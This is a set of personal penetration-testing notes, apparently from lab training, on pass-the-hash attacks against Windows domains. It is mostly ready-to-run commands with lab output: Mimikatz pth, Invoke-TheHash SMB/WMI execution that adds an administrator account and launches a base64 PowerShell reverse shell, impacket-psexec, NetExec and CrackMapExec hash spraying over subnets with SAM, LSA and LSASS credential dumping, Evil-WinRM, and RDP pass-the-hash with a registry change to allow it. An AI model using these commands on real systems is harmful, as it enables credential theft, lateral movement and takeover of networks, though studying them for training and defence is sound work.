# Mimikatz
```Markdown
mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<NT_hash> /domain:<DOMAIN> /run:cmd.exe" exit
```
  
# Invoke-TheHash (Windows)
- used to connect with WMI and SMB
## SMB
```Markdown
Import-Module ./Invoke-TheHash.psd1
Invoke-SMBExec -Target <IP> -Domain <DOMAIN> -Username <user> -Hash <NT_hash> -Command "net user <user> <pass> /add && /net localgroup administrators <user> /add" -Verbose
```
```Markdown
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```
- can then get a reverse shell on the target
```Markdown
./nc.exe -lvnp <port>
# On revshells, choose PowerShell #3 (Base64)
Import-Module ./Invoke-TheHash.psd1
Invoke-WMIExec -Target <machine (DC01)> -Domain <DOMAIN> -Username <user> -Hash <NT_hash> -Command "powershell -e <base64 payload>" 
```
![image 244.png](/image%20244.png)
  
  
# Impacket (Linux)
```Markdown
impacket-psexec <user>@<IP> -hashes :<NT_hash>
```
```Markdown
Nathan2112@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```
  
  
# NetExec (Linux)
```Markdown
netexec smb <IP> -u <user> -d . -H <NT_hash>
```
- if trying to authenticate to multiple computers with the local admin hash, use
`--local-auth`
```Markdown
Nathan2112@htb[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```
- can use the options `-x` to execute commands
    
    - can plant a binary in each of the machines and run it all at once (C2)
    
  
  
# Evil-WinRM
```Markdown
evil-winrm -i <IP> -u <user> -H <NT_hash>
```
```Markdown
Nathan2112@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
  
  
# RDP
```Markdown
xfreerdp3 /v:<IP> /u:<user> /pth:<NT_hash>
```
- restricted admin mode needs to be enabled
  
## Enable Restricted Admin Mode to Allow PtH
```Markdown
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
  
  
crackmapexe smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1
- passes the login info to every machine capable on the domain
![Untitled 21.png](/Untitled%2021.png)
- can also do it with hashes
    
    - use -H instead
    
- can also do “—local-auth —sam”
    
    - dumps the sam
    
- “—local-auth —shares”
    
    - lists the shares on the device
    
- “—local-auth —lsa”
    
    - dumps the lsa (local security authority)
    
- -M is used for different modules
    
    - one example is lsassy
    
    - can steal creds from the lsass because it stores credentials
    
![Untitled 1 8.png](/Untitled%201%208.png)
cmedb - database showing all crackmapexec info
  
crackmapexec with user hash
- “crackmapexec smb 192.168.83.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth”
  
pass the hash dumping the sam
![Untitled 2 8.png](/Untitled%202%208.png)
  
pass the hash dumping the shares we can access
![Untitled 3 6.png](/Untitled%203%206.png)
  
list of all crackmapexec modules
![Untitled 4 4.png](/Untitled%204%204.png)
  
cmedb in action
![Untitled 5 4.png](/Untitled%205%204.png)